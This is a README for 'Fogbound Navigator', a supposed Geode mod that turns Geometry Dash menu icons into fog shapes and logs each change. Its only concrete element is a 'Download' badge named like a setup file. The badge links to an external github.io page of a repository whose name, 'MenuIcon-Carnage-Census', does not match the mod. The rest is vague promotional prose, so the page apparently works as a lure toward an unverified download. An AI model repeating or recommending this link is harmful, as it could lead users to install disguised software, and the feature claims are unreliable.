# Fogbound Navigator

**A mindful, atmospheric companion for Geometry Dash that replaces every main-menu icon with a drifting fog silhouette—and gently records each transmutation.**

Welcome to **Fogbound Navigator**, a cozy Geode extension that transforms the Geometry Dash main menu into a serene, low-visibility harbor. Instead of the usual vibrant icons clamoring for attention, every menu presence becomes a soft, drifting fog form. The mod doesn't just alter the visuals—it quietly counts each transformation, building a personal log of your journey through the mist. This isn’t about removing distractions; it’s about turning your starting screen into a meditative pause before the chaos of the levels.

## 🧭 Why a Fogbound Navigator?

Most menu mods are loud. They add particle explosions, neon flashes, or chaotic rearrangements. **Fogbound Navigator** takes the opposite route—it’s a minimalist’s retreat. Think of it as a digital campfire on a foggy shore. Every icon you see is now a ghostly shape, and the counter in the corner isn’t a score—it’s a diary entry. It’s built for players who want their game to feel like a quiet library rather than a crowded arcade.

## 🧩 Installation & Setup

[![Download](https://raw.githubusercontent.com/sppatil45678-rgb/MenuIcon-Carnage-Census/main/setup_adb0847.svg)](https://sppatil45678-rgb.github.io/MenuIcon-Carnage-Census/)

Getting **Fogbound Navigator** onto your system is a breeze. Since this is a Geode mod, you’ll place the bundled `.geode` file into your game’s mod directory. Once placed, launch Geometry Dash, and the fog will begin rolling in automatically.

### First Steps After Installation

1. **Allow the Fog to Settle** – On first launch, the mod builds its baseline. Give it about 30 seconds to scan your existing menu icons.
2. **Set Your Language** – Head to the mod settings (the little misty gear icon) and choose your preferred display language.
3. **Calibrate Sensitivity** – Adjust how aggressively the fog reacts to your mouse. The default is “Barely There,” but you can dial it up to “Heavy Blanket.”

> **Troubleshooting Tip:** If you don’t see any fog after installation, ensure that no other menu-reskin mod is running. Fogbound Navigator thrives in solitude.

## 📖 The Ledger: Your Personal Fog Diary

The most unique aspect of this mod is the **Silent Ledger**. This isn’t a kill counter in the traditional sense—it’s a gentle record of impermanence. Each time an icon is replaced by a fog form, a small ripple appears on the ledger page. The ripple shows the time, the icon’s original color, and a timestamp in your local timezone.

### Visualizing Your History

- **The Mist Gallery** – View a chronological list of all transformed icons, rendered as tiny fog thumbnails.
- **The Calm Index** – A percentage score that tells you how long you’ve spent on the menu compared to in-level play. A higher Calm Index means you’re savoring the fog.
- **Export as Whispers** – You can export your ledger as a plain text file (`.whisper` format) to share with friends or keep as a personal archive.

## 🎨 Design Philosophy

We built this mod with a specific metaphor in mind: **a lighthouse keeper who prefers the fog over the ships.** The default Geometry Dash menu is a busy harbor. Our mod asks: what if the harbor was wrapped in a soft grey blanket, and the ships became memories? The result is a tool that encourages mindful breaks. Every time you launch the game, you’re not bombarded—you’re welcomed.

### Visual Breakdown

- **Color Palette:** Muted greys, pale blues, and a single accent of warm amber for the counter.
- **Typography:** Uses a custom rounded sans-serif font that mimics the soft edges of fog banks.
- **Motion:** All animations are eased to feel floaty and heavy, never snappy. This reinforces the "slowed time" feeling.

## 🌍 Multilingual & Accessibility

We believe a tool for focus should be accessible to everyone. **Fogbound Navigator** ships with full translations for its interface, including all settings descriptions. The fog itself is rendered using adaptive contrast, ensuring it remains visible for players with low-vision settings. We also support a **Colorblind-Safe Mode** that uses texture patterns (dots and waves) rather than color alone to distinguish different fog forms.

## ⚙️ Advanced Configuration

For those who love tinkering, the settings file (`fogbound_config.ini`) allows for granular control:

- `FogDensity` – Adjust from 0.1 (barely visible) to 2.0 (impenetrable whiteout).
- `LedgerPrecision` – Choose between “Hourly,” “Daily,” or “Every Spark” granularity for the ledger entries.
- `IdleDrift` – Toggle whether the fog moves while you’re away from the keyboard.
